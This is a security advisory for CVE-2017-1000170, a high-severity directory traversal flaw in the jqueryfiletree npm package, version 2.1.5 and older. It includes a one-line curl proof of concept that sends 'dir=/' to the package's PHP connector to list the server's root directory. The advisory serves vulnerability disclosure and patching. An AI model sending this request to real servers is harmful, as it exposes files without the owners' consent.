# [H] jqueryFileTree vulnerable to Directory Traversal

## Summary
Severity: High
Advisory: GHSA-p739-9479-5wr2
CVE: CVE-2017-1000170
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2022-05-13
Source: https://github.com/advisories/GHSA-p739-9479-5wr2
Type: github-advisory

## Affected
- npm: `jqueryfiletree` — affected >=0

## Details
jqueryFileTree 2.1.5 and older is vulnerable to Directory Traversal

### POC:
```bash
curl 'http://localhost:8000/js/jqueryfiletree-2.1.5/dist/connectors/jqueryFileTree.php' -H 'Referer: xxx' -d "dir=/"
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-1000170
- https://github.com/jqueryfiletree/jqueryfiletree/issues/66
- http://packetstormsecurity.com/files/161900/WordPress-Delightful-Downloads-Jquery-File-Tree-1.6.6-Path-Traversal.html
